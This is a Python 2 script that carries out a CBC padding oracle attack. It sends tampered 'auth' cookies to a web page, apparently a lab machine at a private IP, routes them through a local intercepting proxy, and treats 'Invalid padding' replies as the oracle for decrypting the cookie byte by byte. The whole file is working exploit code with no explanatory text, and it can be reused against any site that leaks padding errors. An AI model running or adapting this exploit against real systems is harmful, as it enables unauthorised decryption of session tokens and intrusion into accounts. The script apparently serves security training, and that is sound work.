import subprocess
import sys
import requests
import re
import urllib

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)




def main():
    global ciphertext
    decrypted = [0]*BLOCK_LEN
    plaintext=[]
    original=False


    print "[+] Original: %s\n" %(cookie)

    nb_blocs = len(ciphertext.encode("hex")) / BLOCK_LEN / 2
    print "Nb blocs: IV + %i" %(nb_blocs)
    plaintext=[]

    for b in xrange(1,nb_blocs):    # the very first block is the IV

        block1 = ciphertext[-BLOCK_LEN*2:-BLOCK_LEN]
        block2 = ciphertext[-BLOCK_LEN:]
        beg = ciphertext[:-BLOCK_LEN*2]

        print "\n\n[+] ciphertext:", ciphertext.encode("hex"), '\n'
        print "[+] block1:", block1.encode("hex")
        print "[+] block2:", block2.encode("hex")
        print "-----------------"

        decrypted = [0]*BLOCK_LEN
        block1_part2=[]

        for j in xrange(1,BLOCK_LEN+1):
            padding = j+1
            byte_pos = BLOCK_LEN-j

            for value in xrange(0,256):
                new_block1 = block1[:byte_pos] + chr(value) + "".join(block1_part2)     #.join() because can't concatenate str+list
                new_cipher=beg+new_block1+block2

                #print value, oracle(new_cipher)
                if send(new_cipher):        #padding valid, can be either a value that produces the padding we want, or the original value
                    if chr(value) == block1[byte_pos]: continue #if value found is the same as the original, then ignore and continue
                    if chr(value) != block1[byte_pos]:
                        char = j ^ ord(block1[byte_pos]) ^ value         #char = 1 ^ block1[15] ^ value
                        decrypted[byte_pos]=char
                        plaintext.insert(0,chr(char))
                        # print decrypted
                        sys.stdout.write('\r'+ '%s' %(decrypted))
                        sys.stdout.flush()
                        # print "%s\r" %(decrypted)

                        block1_part2 = calculate_block1_part2(padding, block1, decrypted)   #now we want the previous char, so we do the maths to have a valid padding for the byte we're after

                        break

                if value==255:
                    # if no other solution, this means that the value is the same as the original
                    # therefore, for the first round that means the original padding is 1
                    # otherwise we are now at the point where we found the original padding: say the original padding is 12, there will be a moment when we will look for a padding of 12, hence the value is the same
                    char = j ^ ord(block1[byte_pos]) ^ ord(block1[byte_pos])         #char = 1 ^ block1[15] ^ original value
                    decrypted[byte_pos]=char
                    plaintext.insert(0,chr(char))
                    # print decrypted
                    sys.stdout.write('\r' + '%s' %(decrypted))
                    sys.stdout.flush()                  

                    block1_part2 = calculate_block1_part2(padding, block1, decrypted)

                    break
        

        ciphertext=ciphertext[:-BLOCK_LEN]  # remove the last block


    print "\n\n[+]", plaintext, STEPS
    print ''.join(plaintext)




def send(ciphertext):
    proxies = {
      'http': 'http://127.0.0.1:8080',
      'https': 'http://127.0.0.1:8080',
    }

    global STEPS
    STEPS+=1

    cipher=urllib.quote(ciphertext.encode('base64'))

    COOKIES = {"auth":cipher}
    
    # print "Sent:", cipher, '\n'
    r = requests.post(URL, cookies=COOKIES, verify=False, proxies=proxies)

    return "Invalid padding" not in r.text


def calculate_block1_part2(padding, block1, decrypted):
    IV_c=[]
    block1_part2=[]
    for k in xrange(1,padding):     #padding because out of range: for i in xrange(0,1) -> only print 0
        #print padding, ord(block1[BLOCK_LEN-k]), decrypted[BLOCK_LEN-k], '=', padding ^ ord(block1[BLOCK_LEN-k]) ^ decrypted[BLOCK_LEN-k]  # BLOCK_LEN-k because we start from the end of the block
        IV_c = chr(padding ^ ord(block1[BLOCK_LEN-k]) ^ decrypted[BLOCK_LEN-k]) # [padding we want] ^ [byte previous bloc] ^ [decrypted byte value]  // i.e. 2 ^ ord(block1[15]) ^ 12
        block1_part2.insert(0,IV_c)

    return block1_part2




URL="http://192.168.62.133/index.php"
COOKIES={"auth":"XiFnKGRM67n53Tf%2BZ3yyQa2iR%2FGM%2FStB"}

cookie="XiFnKGRM67n53Tf%2BZ3yyQa2iR%2FGM%2FStB"
ciphertext=urllib.unquote(cookie).decode('utf8').decode('base64')

BLOCK_LEN = 8
STEPS = 0

if __name__ == "__main__":
    main()                  
